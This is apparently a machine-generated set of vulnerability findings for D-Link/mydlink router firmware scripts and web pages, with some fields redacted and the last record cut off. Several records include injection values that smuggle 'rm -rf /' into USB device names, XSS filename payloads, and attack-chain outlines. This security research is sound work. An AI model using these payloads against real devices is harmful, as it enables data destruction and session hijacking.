{"name": "network_input-form_network-ip_config_tamper", "file_path": "htdocs/mydlink/form_network", "location": "htdocs/mydlink/form_network:11,17", "risk_score": 8.5, "confidence": 9.0, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "$lanaddr = $_POST[\"config.lan_network_address\"];\nset($path_lan1_inet.\"/ipv4/ipaddr\", $lanaddr);", "link_identifiers": ["$_POST['config.lan_network_address']", "$lanaddr", "set()", "$path_lan1_inet", "/ipv4/ipaddr", "$settingsChanged"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-form_network-dhcp_control", "file_path": "htdocs/mydlink/form_network", "location": "htdocs/mydlink/form_network:14-21", "risk_score": 6.0, "confidence": 7.25, "description": "DHCP Service State Control Flaw: The DHCP switch can be controlled via the 'config.dhcp_server_enabled' parameter, but there is a risk of type confusion. Trigger condition: Submitting non-string type parameters (e.g., arrays). Constraint check: Only simple value comparison (if($dhcp_enable==\"1\")). Security impact: a) Service anomaly causing functional disruption; b) Potential exploitation if the configuration system has memory corruption vulnerabilities.", "code_snippet": "if($dhcp_enable==\"1\"){\n\tset($path_inf_lan1.\"/dhcps4\", \"DHCPS4-1\");\n}", "link_identifiers": ["$_POST['config.dhcp_server_enabled']", "$dhcp_enable", "set($path_inf_lan1.\"/dhcps4\")", "/dhcps4", "$path_inf_lan1"], "notes": "Recommend subsequent testing: Submit array-type parameter validation to test PHP error handling mechanisms. Related knowledge base record: The security validation requirements for the set() function in xnode.php also affect the risk level of this vulnerability."}
{"name": "hardware_input-command_injection-usbmount_helper_add_mount", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 9.0, "confidence": 7.75, "description": "In the operation branches of 'add' and 'mount', a command injection vulnerability exists. The specific manifestation is that the variable $dev (concatenated from $2 and $3) is directly used in the command 'scut -p$dev -f1' without validation. An attacker can inject malicious commands (e.g., '$2=\"a;rm -rf /;\"') by controlling the USB device name ($2) or partition number ($3). Trigger condition: The script is automatically invoked by the system when a malicious USB device is inserted. Actual impact: Arbitrary command execution with REDACTED_PASSWORD_PLACEHOLDER privileges, as the script is typically executed by REDACTED_PASSWORD_PLACEHOLDER. Boundary check: The script does not perform character filtering or length restrictions on $2/$3.", "code_snippet": "xmldbc -P ... -V size=`df|scut -p$dev -f1`", "link_identifiers": ["usbmount_helper.sh", "scut", "dev", "df", "add", "mount", "xmldbc", "size"], "notes": "Verify whether the USB device name can be controlled through physical device attributes (such as serial number). Related file: /etc/events/MOUNT.ALL.php (event handler). Associated keywords [usbmount_helper.sh, xmldbc, dev] already exist in the knowledge base."}
{"name": "hardware_input-event_injection-usbmount_helper_suffix", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.5, "confidence": 6.5, "description": "The event triggering mechanism is vulnerable to parameter injection. The 'event' command uses $suffix (case conversion of $2 + concatenation with $3) as the event name, with the command string directly embedding $dev. Attackers could craft malicious $2 values to trigger unintended events or inject commands (e.g., '$2=\"ALL;rm -rf /;#\"'). Trigger condition: Automatically executes during USB device insertion/removal. Actual impact: May bypass security events or trigger unauthorized operations. Boundary check: No special character filtering implemented for $2/$3.", "code_snippet": "event MOUNT.$suffix add \"usbmount mount $dev\"", "link_identifiers": ["event", "suffix", "MOUNT.$suffix", "UNMOUNT.$suffix", "DISKUP", "dev"], "notes": "Analyze whether the implementation of the 'event' command (possibly located in /bin/event) safely handles parameters. The knowledge base already contains related keywords [event, dev]."}
{"name": "hardware_input-parameter_passing-usbmount_helper_php", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 6.0, "confidence": 5.75, "description": "Cross-script parameter passing risk. Unfiltered $2/$3/$4 parameters are passed to PHP scripts (e.g., usbmount_helper.php) via 'xmldbc/phpsh'. If the PHP script lacks secondary validation, this could create an exploit chain (such as SQL injection or file operations). Trigger condition: when performing any USB-related operations. Actual impact: depends on sub-script security, potentially expanding the attack surface. Boundary check: this script performs no parameter escaping or type validation.", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["xmldbc", "phpsh", "prefix", "pid", "fs", "mntp", "usbmount_helper.php"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-movie_show_media-xss", "file_path": "REDACTED_SENSITIVE_DATA", "location": "movie.php:71-84", "risk_score": 9.0, "confidence": 9.25, "description": "Stored XSS Vulnerability: Attackers upload malicious filenames (e.g., `<svg onload=alert(1)>`). When users access the video list, the show_media_list function directly inserts unfiltered obj.name into the title attribute and innerHTML (lines 71-84). Trigger conditions: 1) Attackers can upload files; 2) Users browse movie.php. Security impact: Session hijacking, remote control. Boundary check: Complete lack of input sanitization.", "code_snippet": "str += '<a href=\"...\" title=\"' + obj.name + '\"><div>' + file_name + '</div></a>'", "link_identifiers": ["show_media_list", "obj.name", "file_name", "innerHTML", "title"], "notes": "Full exploit chain: 1) Implant malicious filename through file upload interface 2) Trick user into accessing movie.php page"}
{"name": "network_input-movie_ListCategory-csrf", "file_path": "REDACTED_SENSITIVE_DATA", "location": "movie.php:114", "risk_score": 6.0, "confidence": 5.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "xml_request.json_cgi(para)", "link_identifiers": ["ListCategory", "json_cgi", "gen_token_req", "XMLRequest"], "notes": "Dynamic verification required: Construct a PoC page to test request success rate"}
{"name": "network_input-movie_GetFile-param_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "movie.php:71", "risk_score": 7.0, "confidence": 5.5, "description": "Parameter injection risk: obj.name is encoded with REDACTED_SECRET_KEY_PLACEHOLDER and directly concatenated into the GetFile URL (line 71). If the backend /dws/api/GetFile does not perform path normalization, path traversal could be triggered via encoded characters (%2e%2e%2f). Trigger condition: attacker controls the filename or directly constructs a malicious request.", "code_snippet": "var req=\"/dws/api/GetFile?filename=\"+REDACTED_SECRET_KEY_PLACEHOLDER(obj.name)", "link_identifiers": ["obj.name", "REDACTED_SECRET_KEY_PLACEHOLDER", "GetFile", "filename"], "notes": "Specialized analysis required to verify the feasibility of the vulnerability in /dws/api/GetFile.php"}
{"name": "network_input-HNAP_Login-LoginPassword", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.0, "confidence": 7.0, "description": "Login.xml defines the HNAP login interface, which includes four string parameters: Action, REDACTED_PASSWORD_PLACEHOLDER, LoginPassword, and Captcha. The parameter name LoginPassword suggests that passwords may be transmitted in plaintext (with no encryption-related attributes). This interface does not specify a handler, indicating it is processed by a unified SOAP processor. Attackers could attempt injection attacks (such as SQL injection or command injection) by crafting malicious REDACTED_PASSWORD_PLACEHOLDER or LoginPassword parameters. Trigger condition: sending a POST request with tainted parameters to the HNAP interface. The actual risk depends on whether the backend processor performs adequate parameter filtering and boundary checks, requiring further validation.", "code_snippet": "", "link_identifiers": ["LoginPassword", "REDACTED_PASSWORD_PLACEHOLDER", "Action", "http://purenetworks.com/HNAP1/Login", "Captcha"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "vuln-unconditional-erase-S22mydlink-18", "file_path": "etc/scripts/erase_nvram.sh", "location": "etc/init.d/S22mydlink.sh:18", "risk_score": 9.0, "confidence": 8.25, "description": "Unconditional Erasure Vulnerability: S22mydlink.sh unconditionally invokes this script after dev_uid generation, erasing critical nvram data via 'dd if=/dev/zero of=$NVRAM_MTDBLOCK' followed by an immediate reboot. Trigger Condition: System executes the initialization script S22mydlink.sh (e.g., during device startup/reboot). With no input validation or boundary checks, an attacker can trigger this by contaminating lanmac to cause abnormal dev_uid generation, resulting in permanent denial of service through device configuration reset + boot loop.", "code_snippet": "uid=`mydlinkuid $mac`\n/etc/scripts/erase_nvram.sh\nreboot", "link_identifiers": ["S22mydlink.sh", "erase_nvram.sh", "dd", "NVRAM_MTDBLOCK", "dev_uid", "lanmac", "reboot"], "notes": "Actual Impact Verification: The lanmac can be corrupted via HTTP APIs (such as UPnP interfaces). Further analysis of the devdata binary is required to confirm the NVRAM write mechanism. Associated Propagation Path: HTTP API â†’ NVRAM corruption â†’ Initialization script trigger."}
{"name": "vuln-script-implant-S22mydlink-21", "file_path": "etc/scripts/erase_nvram.sh", "location": "etc/init.d/S22mydlink.sh:21-23", "risk_score": 10.0, "confidence": 8.25, "description": "Command Execution Vulnerability: The S22mydlink.sh script executes /etc/scripts/erase_nvram.sh upon detection and triggers a device reboot. Trigger Condition: An attacker creates this file via arbitrary file upload vulnerabilities (e.g., exploiting flaws in the web management interface upload function). Since the script runs with REDACTED_PASSWORD_PLACEHOLDER privileges, attackers can implant malicious payloads such as reverse shells to achieve full device control, constituting the final stage of an RCE attack chain.", "code_snippet": "if [ -e \"/etc/scripts/erase_nvram.sh\" ]; then\n\t/etc/scripts/erase_nvram.sh\n\treboot\nfi", "link_identifiers": ["S22mydlink.sh", "erase_nvram.sh", "/etc/scripts/erase_nvram.sh", "reboot"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-bridge_handler-ACTION_ExploitChain", "file_path": "etc/scripts/bridge_handler.php", "location": "etc/scripts/bridge_handler.php:22-42", "risk_score": 8.5, "confidence": 7.5, "description": "Unvalidated State Transition Vulnerability: Attackers can trigger a high-risk operation chain by tampering with the $ACTION variable. When $ACTION='DISCONNECTED': 1) Modify the /inf:1/dhcps4 configuration 2) Restart the DHCPS4.BRIDGE-1 service 3) Forcefully set the br0 interface IP to 192.168.0.50/24 4) Execute service HTTP restart via the xmldbc -P mechanism. Trigger condition: Controlling the $ACTION input (requires an external injection point). Actual impact: a) Network configuration tampering b) DHCP service disruption c) Temporary denial of service due to HTTP service restart.", "code_snippet": "if ($ACTION == \"DISCONNECTED\") {\n    cmd (\"xmldbc -s /inf:1/dhcps4 \\\"DHCPS4-3\\\"\");\n    cmd (\"service DHCPS4.BRIDGE-1 restart\");\n    cmd (\"ifconfig br0 192.168.0.50/24\");\n    cmd(\"service HTTP restart\");\n}", "link_identifiers": ["$ACTION", "DISCONNECTED", "cmd", "xmldbc", "/inf:1/dhcps4", "service", "br0", "HTTP"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-bridge_handler-DHCPS4_Tamper", "file_path": "etc/scripts/bridge_handler.php", "location": "etc/scripts/bridge_handler.php:27,34", "risk_score": 7.0, "confidence": 7.5, "description": "Sensitive configuration tampering vulnerability: The /inf:1/dhcps4 node can be directly modified via the xmldbc command without prior permission verification. When $ACTION='CONNECTED', the configuration is cleared, and when $ACTION='DISCONNECTED', the configuration is reset, allowing attackers to cause DHCP service disruptions.", "link_identifiers": ["xmldbc", "/inf:1/dhcps4", "CONNECTED", "DISCONNECTED"]}
{"name": "nvram_set-dnslog-unfiltered_input", "file_path": "htdocs/web/dnslog.php", "location": "dnslog.php:17-20,40-42", "risk_score": 7.0, "confidence": 7.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "add($base.\"entry:\".$idx.\"/domain\", $domain);\nset($base.\"entry:\".$idx.\"/domain\", $domain);", "link_identifiers": ["$RAW_VALUE", "cut", "$domain", "add", "set", "REDACTED_SENSITIVE_DATA", "query", "isempty"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "nvram_set-dnslog-missing_length_validation", "file_path": "htdocs/web/dnslog.php", "location": "dnslog.php:5-7,25-27,40-42", "risk_score": 6.5, "confidence": 6.0, "description": "nvram_set  \n\nMissing log entry length validation: The program limits the number of log entries via $MAX_COUNT=20 but fails to enforce length/format checks on the $domain/$ip variables in individual records. Trigger condition: When malicious DNS queries generate excessively long domain names (>250 characters). Potential impact: If the add/set functions contain buffer overflow vulnerabilities, memory corruption may occur. Boundary constraint: The shift_entry() function implements entry rotation but does not handle individual record length.", "code_snippet": "$domain = cut($RAW_VALUE, 2,',');\nadd($base.\"entry:\".$idx.\"/domain\", $domain);", "link_identifiers": ["$domain", "$ip", "$MAX_COUNT", "isempty", "add", "set", "shift_entry"], "notes": "Global analysis required to confirm: 1) Whether buffer overflow exists in NVRAM operation functions (add/set) 2) Actual length limitation of firmware NVRAM storage area"}
{"name": "env_set-PATH-/mydlink", "file_path": "etc/profile", "location": "etc/profile:1", "risk_score": 6.0, "confidence": 8.25, "description": "Add the /mydlink directory to the PATH environment variable, triggered when the user logs in via SSH/telnet or other shell login methods. No path security check is performed. If an attacker can write malicious binaries to /mydlink (e.g., through other vulnerabilities), the malicious programs will take precedence when the user executes system commands. The actual impact depends on the write permissions of the /mydlink directory and the execution permissions of programs within it.", "code_snippet": "PATH=$PATH:/mydlink", "link_identifiers": ["PATH", "/mydlink"], "notes": "Pending verification: 1) /mydlink directory permissions (recommend using the stat tool) 2) Directory content analysis 3) Whether associated network services invoke programs in this directory; Related keyword: PATH (existing records available)"}
{"name": "attack_chain-env_pollution_to_rce", "file_path": "etc/profile", "location": "[HIDDEN]: etc/init.d/S22mydlink.sh + etc/profile", "risk_score": 9.0, "confidence": 7.75, "description": "Full attack chain: Environment variable pollution leading to remote code execution. Steps: 1) Attacker pollutes the $MYDLINK environment variable through an unvalidated network input point (e.g., HTTP parameter); 2) During system startup, the S22mydlink.sh script executes, mounting a malicious squashfs to the /mydlink directory; 3) The PATH environment variable includes /mydlink upon user login; 4) When the administrator executes system commands (e.g., ifconfig), malicious binaries are prioritized for execution. Trigger conditions: a) Existence of $MYDLINK pollution vector b) Successful mounting of /mydlink c) Administrator command execution. Success probability depends on $MYDLINK pollution feasibility and directory write control.", "code_snippet": "[HIDDEN]1: mount -t squashfs $MYDLINK /mydlink (S22mydlink.sh)\n[HIDDEN]2: PATH=$PATH:/mydlink (profile)", "link_identifiers": ["MYDLINK", "PATH", "/mydlink", "mount", "squashfs"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "xss-photo_media_list-1", "file_path": "REDACTED_SENSITIVE_DATA", "location": "photo.php:[HIDDEN] show_media_list[HIDDEN]", "risk_score": 8.0, "confidence": 8.0, "description": "Client-side stored XSS vulnerability:\n- Manifestation: The show_media_list function directly inserts obj.name (filename) into HTML without escaping, allowing attackers to trigger XSS by uploading malicious filenames\n- Trigger condition: Malicious script automatically executes when users access the image list page (requires REDACTED_PASSWORD_PLACEHOLDER or user browsing directory containing malicious files)\n- Constraints: Special characters are allowed in filenames (currently no filtering mechanism found), but limited by character restrictions of file upload component\n- Security impact: Session hijacking/phishing attacks, risk score 8.0\n- Exploitation method: Upload an image with filename containing <script>payload</script>.jpg", "code_snippet": "str += \"<tr ...><td>...<a ...>\" + file_name + \"</a></td></tr>\"", "link_identifiers": ["obj.name", "show_media_list", "media_info.files", "HASH_TABLE"], "notes": "Critical Dependencies: The filtering mechanism for obj.name in the file upload component (requires specialized validation). Associated Risks: 1) Combined with CSRF, it can force users to access malicious directories. 2) Forms a complete exploitation path with the existing movie.php attack chain in the knowledge base (file upload â†’ XSS trigger)."}
{"name": "network_input-firmware_upload-form_exposure", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 9.0, "description": "The firmware update form (action='fwupload.cgi') exposes an unauthenticated file upload interface. Trigger condition: User selects a file via the 'Select File' button and submits by clicking 'Upload'. The frontend only performs UI updates (REDACTED_SECRET_KEY_PLACEHOLDER function) without file type/content validation. Attackers can upload malicious firmware, with actual risk depending on the validation strictness of fwupload.cgi. If this CGI contains vulnerabilities (such as command injection/buffer overflow), it could form a complete attack chain.", "code_snippet": "<form id=\"fwupload\" name=\"fwupload\" method=\"post\" action=\"fwupload.cgi\" enctype=\"multipart/form-data\">", "link_identifiers": ["fwupload.cgi", "select_Folder_a", "firmwareUpgrade", "form", "enctype", "REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "It is necessary to analyze the server-side validation logic integrity in conjunction with fwupload.cgi."}
{"name": "network_input-firmware_upload-js_bypass", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 7.5, "confidence": 8.75, "description": "The JavaScript submission logic (UpgradeFWâ†’FWUpgrade_Check_btn) completely bypasses front-end validation. Trigger condition: Clicking the 'Upload' button directly calls document.forms['fwupload'].submit(). Security impact: Forces reliance on server-side security controls, making it vulnerable to malicious firmware exploitation if fwupload.cgi has validation flaws.", "code_snippet": "function UpgradeFW(){document.forms['fwupload'].submit()}", "link_identifiers": ["UpgradeFW", "FWUpgrade_Check_btn", "document.forms", "submit()"], "notes": ""}
{"name": "network_input-music.php-GetFile_endpoint", "file_path": "REDACTED_SENSITIVE_DATA", "location": "music.php", "risk_score": 0.0, "confidence": 5.0, "description": "The file is purely client-side HTML/JavaScript with no server-side PHP execution logic. User input is processed on the client side through DOM operations (such as search_box.value) and sent to server endpoints (e.g., '/dws/api/GetFile') via XMLHttpRequest. There are no directly dangerous operations, but it exposes server-side interaction interfaces.", "link_identifiers": ["XMLHttpRequest", "get_media_list", "/dws/api/GetFile", "JSON.parse"], "notes": "Analyze AJAX target endpoints: 1) Server-side processing file for '/dws/api/GetFile' 2) Other XMLHttpRequest request paths. Client-side input validation may be bypassed, but actual vulnerabilities depend on server-side processing. Related findings: APIs such as /dws/api/AddDir and /dws/api/UploadFile pose path traversal/file upload risks (refer to records like pending_analysis-AddDir_path_traversal)."}
{"name": "network_input-login_form-sensitive_parameter_naming", "file_path": "REDACTED_SENSITIVE_DATA", "location": "/www/Login.html:127(REDACTED_PASSWORD_PLACEHOLDER),147(REDACTED_PASSWORD_PLACEHOLDER_with_Captcha),152(input_Captcha)", "risk_score": 7.5, "confidence": 9.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "document.getElementById(\"REDACTED_PASSWORD_PLACEHOLDER\").value;", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "REDACTED_PASSWORD_PLACEHOLDER_with_Captcha", "input_Captcha", "OnClickLogin", "doLogin"], "notes": "It is necessary to analyze the authentication implementation in /cgi-bin/SOAPLogin.js to verify the actual feasibility of brute-force attacks."}
{"name": "network_input-captcha_handler-external_dependency", "file_path": "REDACTED_SENSITIVE_DATA", "location": "/www/Login.html:94-96(captcha.cgi[HIDDEN])", "risk_score": 7.0, "confidence": 7.75, "description": "The CAPTCHA implementation relies on external components: dynamically generating CAPTCHA via /captcha.cgi, using COMM_RandomStr to produce random values. Trigger condition: accessing captcha.cgi when CAPTCHA mode is enabled. Security impact: if captcha.cgi has random number generation flaws or replay vulnerabilities, it may completely bypass CAPTCHA protection.", "code_snippet": "AJAX.sendRequest(\"/captcha.cgi\", \"DUMMY=YES\");", "link_identifiers": ["/captcha.cgi", "generate_Captcha", "COMM_RandomStr", "AJAX.sendRequest"], "notes": "The random number generation and session management logic of captcha.cgi must be audited."}
{"name": "network_input-soap_integration-attack_surface", "file_path": "REDACTED_SENSITIVE_DATA", "location": "/www/Login.html:10-17(JS[HIDDEN])", "risk_score": 6.5, "confidence": 7.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "<script src=\"/js/SOAPLogin.js\"></script>", "link_identifiers": ["SOAPLogin.js", "SOAPAction.js", "localStorage", "sessionStorage", "doLogin"], "notes": "Subsequent efforts should focus on analyzing whether the SOAP protocol processing layer contains XXE or deserialization vulnerabilities."}
{"name": "xss-filename-html-output", "file_path": "REDACTED_SENSITIVE_DATA", "location": "photo.php:68 (show_media_list [HIDDEN])", "risk_score": 8.5, "confidence": 8.5, "description": "Stored XSS vulnerability: obj.name (from uploaded filename) is directly output to the HTML title attribute without filtering (line 68). When an attacker uploads a filename containing quotes/XSS payloads, the XSS is automatically triggered when users visit the photo list page. Trigger conditions: 1) Attacker can upload files 2) Victim accesses photo.php. Actual impact: Can steal session cookies or leak user data in combination with localStorage.", "code_snippet": "title=\"\" + obj.name + \"\"", "link_identifiers": ["obj.name", "show_media_list", "media_info.files", "ListCategory API"], "notes": "Verify the filtering mechanism of the file upload module for filenames. It is recommended to analyze the upload processing logic (e.g., /dws/api/Upload)."}
{"name": "path-traversal-GetFileAPI", "file_path": "REDACTED_SENSITIVE_DATA", "location": "photo.php:66-67", "risk_score": 7.0, "confidence": 6.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "req=\"/dws/api/GetFile?id=\" + ... + \"&path=\"+REDACTED_SECRET_KEY_PLACEHOLDER(obj.path)", "link_identifiers": ["GetFile API", "obj.volid", "obj.path", "REDACTED_SECRET_KEY_PLACEHOLDER"], "notes": "The backend implementation of /dws/api/GetFile must be analyzed (recommended for follow-up tasks)"}
{"name": "localStorage-language-leak", "file_path": "REDACTED_SENSITIVE_DATA", "location": "photo.php:28-30", "risk_score": 4.5, "confidence": 5.5, "description": "LocalStorage information leakage auxiliary risk: storing language settings (line 28), while inherently low-risk, can be read when combined with an XSS vulnerability. Trigger condition: requires prior exploitation of an XSS vulnerability to execute malicious JS. Actual impact: extends XSS attack surface, potentially obtaining user preference settings.", "code_snippet": "if (localStorage.getItem('language') === null) InitLANG(\"en-us\");", "link_identifiers": ["localStorage", "InitLANG", "language"], "notes": "It is recommended to check whether other pages store higher-risk data such as authentication tokens in localStorage."}
{"name": "network_input-authentication.cgi-eval_json_injection", "file_path": "REDACTED_SENSITIVE_DATA", "location": "postxml.js:0 (Login_Send_Digest) 0x0", "risk_score": 8.5, "confidence": 7.75, "description": "In the Login_Send_Digest function, eval() is used to parse the JSON response from authentication.cgi. Attackers can inject malicious JSON through man-in-the-middle attacks or server-side vulnerabilities to trigger XSS/RCE. The escape() function only encodes URL characters and cannot defend against JSON injection. Trigger condition: controlling the response content of authentication.cgi.", "code_snippet": "var JsonData = eval('(' + json + ')');", "link_identifiers": ["Login_Send_Digest", "eval", "json", "authentication.cgi", "escape"], "notes": "Verify whether the server's authentication.cgi filters responses; it is recommended to analyze the network middleware in subsequent steps."}
{"name": "network_input-session.cgi-escape_insufficient", "file_path": "REDACTED_SENSITIVE_DATA", "location": "postxml.js:0 (Login) 0x0", "risk_score": 7.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["Login", "user", "REDACTED_SENSITIVE_DATA", "captcha", "escape", "session.cgi"], "notes": "Analyze the session.cgi processing logic to confirm the actual risk."}
{"name": "network_input-captcha.cgi-plaintext_transmission", "file_path": "REDACTED_SENSITIVE_DATA", "location": "postxml.js:0 (Captcha/Login) 0x0", "risk_score": 8.0, "confidence": 9.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "AJAX.sendRequest(\"captcha.cgi\", \"DUMMY=YES\");", "link_identifiers": ["AJAX.sendRequest", "captcha.cgi", "session.cgi", "uid", "document.cookie"], "notes": "Check whether the firmware enforces HTTPS; perform correlation analysis on network configuration"}
{"name": "network_input-seama.cgi-ulcfgbin", "file_path": "htdocs/web/System.html", "location": "System.html: [HIDDEN]", "risk_score": 9.0, "confidence": 8.75, "description": "Unverified File Upload Vulnerability: Arbitrary files can be submitted to seama.cgi via the ulcfgbin form, triggered by the 'Restore' button. Absence of file type/size validation allows attackers to upload malicious firmware or scripts. Combined with processing flaws in seama.cgi, this may lead to RCE. Trigger conditions: 1) Attacker crafts malicious file; 2) Submits via HTTP request to seama.cgi; 3) Backend lacks boundary checks.", "link_identifiers": ["ulcfgbin", "seama.cgi", "select_Folder", "RCF_Check_btn"], "notes": "Immediate analysis of the boundary check mechanism in seama.cgi is required; related keywords: /usr/bin/upload (potential upload handler)"}
{"name": "network_input-SOAPAction-Reboot", "file_path": "htdocs/web/System.html", "location": "System.html: JavaScript[HIDDEN]", "risk_score": 8.5, "confidence": 8.75, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "sessionStorage.setItem('RedirectUrl','http://dlinkrouter.local/');\nsoapAction.sendSOAPAction('Reboot',null,null)", "link_identifiers": ["SOAPAction", "Reboot", "REDACTED_SECRET_KEY_PLACEHOLDER", "sessionStorage.setItem", "Device_FDReboot"], "notes": "Verify how SOAPAction.js constructs system calls; Related knowledge base keywords: 'Reboot' (may invoke /etc/scripts/erase_nvram.sh), 'SOAPAction' (related to HNAP protocol handling)"}
{"name": "network_input-initialValidate.js-bypass", "file_path": "htdocs/web/System.html", "location": "System.html: JavaScript[HIDDEN]", "risk_score": 7.0, "confidence": 9.75, "description": "Front-end validation mechanism failure: initialValidate.js is not invoked during the submission of critical forms (dlcfgbin/ulcfgbin), allowing all user inputs to be directly submitted to the back-end. Attackers can bypass potential front-end filtering and directly target back-end CGIs. Trigger conditions: 1) Attacker crafts malicious input; 2) Directly submits the form to the back-end CGI; 3) Back-end lacks input validation.", "link_identifiers": ["initialValidate.js", "dlcfgbin", "ulcfgbin", "form_submit"], "notes": "Attack Chain Correlation: This vulnerability allows attackers to bypass front-end protections and directly exploit the file upload flaw in 'network_input-seama.cgi-ulcfgbin'; it is recommended to audit all forms relying on initialValidate.js."}
{"name": "network_input-index.php-user_credential_concatenation", "file_path": "REDACTED_SENSITIVE_DATA", "location": "www/index.php (JavaScript[HIDDEN])", "risk_score": 7.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["[REDACTED_PASSWORD]", "[REDACTED_PASSWORD]", "get_by_id", "XMLRequest.exec_auth_cgi", "hex_hmac_md5"], "notes": "[REDACTED_PASSWORD]"}
{"name": "network_input-index.php-REDACTED_PASSWORD_PLACEHOLDER_case_conversion", "file_path": "REDACTED_SENSITIVE_DATA", "location": "www/index.php (send_request[HIDDEN])", "risk_score": 6.5, "confidence": 8.0, "description": "The REDACTED_PASSWORD_PLACEHOLDER (REDACTED_PASSWORD_PLACEHOLDER) is concatenated to the authentication request in plaintext, only converted via toLowerCase(). No character set restrictions (special characters allowed) or length boundaries are enforced. Attackers could craft malicious REDACTED_PASSWORD_PLACEHOLDERs (e.g., containing command separators) to attempt injection. Trigger condition: form submission; potential impact: combined with CGI parsing vulnerabilities, command injection could be achieved, with moderate success probability (requires unfiltered backend).", "link_identifiers": ["toLowerCase", "exec_auth_cgi", "redirect_category_page"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "network_input-index.php-password_hmac_buffer", "file_path": "REDACTED_SENSITIVE_DATA", "location": "www/index.php (get_auth_info)", "risk_score": 5.0, "confidence": 7.0, "description": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["REDACTED_PASSWORD_PLACEHOLDER", "hex_hmac_md5", "media_info.challenge"], "notes": "REDACTED_SENSITIVE_DATA"}
{"name": "xss-doc_php_search-1", "file_path": "REDACTED_SENSITIVE_DATA", "location": "doc.php (JavaScript[HIDDEN])", "risk_score": 7.0, "confidence": 9.0, "description": "There exists an unescaped HTML concatenation-based XSS vulnerability. Specific manifestation: Any value input by users through the search box (id='search_box') is directly concatenated into HTML by the JavaScript function show_media_list() (using indexOf for filtering only checks the prefix without validating content). Trigger condition: An attacker lures users into submitting search requests containing malicious scripts. Security impact: Can execute arbitrary JS code to steal sessions/redirect, with a risk rating of 7.0 due to no authentication requirement and full control over input. Boundary check: Only verifies input length > 0, with no sanitization or escaping of content.", "code_snippet": "if (search_value.length > 0){\n  if (which_action){\n    if(file_name.indexOf(search_value) != 0){...}", "link_identifiers": ["search_box", "show_media_list", "indexOf", "get_media_list", "storage_user.get", "/dws/api/GetFile"], "notes": "Requires combination with other vulnerabilities to form a complete attack chain (e.g., stealing administrator cookies). Recommended follow-up analysis: 1) Examine the associated API endpoint /dws/api/GetFile (already exists in the knowledge base) 2) Verify whether storage_user.get exposes sensitive data"}
{"name": "network_input-folder_view-path_traversal", "file_path": "REDACTED_SENSITIVE_DATA", "location": "REDACTED_SENSITIVE_DATA", "risk_score": 8.0, "confidence": 8.25, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "var obj_path = current_path + \"/\" + obj.name;\npara = \"AddDir?id=\" + ... + \"&path=\" + REDACTED_SECRET_KEY_PLACEHOLDER_modify(current_path);", "link_identifiers": ["id", "volid", "path", "dirname", "filename", "filenames", "current_path", "obj.name", "obj_path", "REDACTED_SECRET_KEY_PLACEHOLDER_modify", "UploadFile", "AddDir", "DelFile"], "notes": "Priority verification for backend interfaces: 1) Handling of the filename parameter in /dws/api/UploadFile 2) Parsing logic for the filenames parameter in JSON format in /dws/api/DelFile 3) Potential bypass in path normalization functions"}
{"name": "network_input-getcfg-SERVICES_path_traversal", "file_path": "htdocs/web/getcfg.php", "location": "getcfg.php:40", "risk_score": 8.0, "confidence": 8.5, "description": "REDACTED_SENSITIVE_DATA", "code_snippet": "REDACTED_SENSITIVE_DATA", "link_identifiers": ["$_POST[\"SERVICES\"]", "$GETCFG_SVC", "dophp", "isfile", "REDACTED_SENSITIVE_DATA", ".xml.php"], "notes": "The requirements must be met: 1) The target .xml.php file exists 2) The file extension is strictly enforced as .xml.php. Subsequent recommendation is to enumerate all .xml.php files in the firmware to assess code execution risks."}
{"name": "network_input-getcfg-CACHE_unauthorized", "file_path": "htdocs/web/getcfg.php", "location": "getcfg.php:20", "risk_score": 8.0, "confidence": 6.5, "description": "Unauthorized Session Cache Leakage: When a POST request includes the CACHE=true parameter, it directly outputs the contents of the /runtime/session/$SESSION_UID/postxml file, completely bypassing the $AUTHORIZED_GROUP permission check. Trigger conditions: 1) Predicting or leaking a valid $SESSION_UID (e.g., through timing analysis) 2) Sending a CACHE=true request. Actual impact: Leakage of sensitive session data (including potential authentication credentials). Constraints: Requires a valid $SESSION_UID, but the generation mechanism is unverified (posing a low-entropy prediction risk).", "code_snippet": "if ($_POST[\"CACHE\"] == \"true\") {\n\techo dump(1, \"/runtime/session/\".$SESSION_UID.\"/postxml\");\n}", "link_identifiers": ["dump", "SESSION_UID", "/runtime/session", "postxml", "CACHE", "AUTHORIZED_GROUP"], "notes": "The generation mechanism for $SESSION_UID is not clearly defined. It is recommended to subsequently analyze 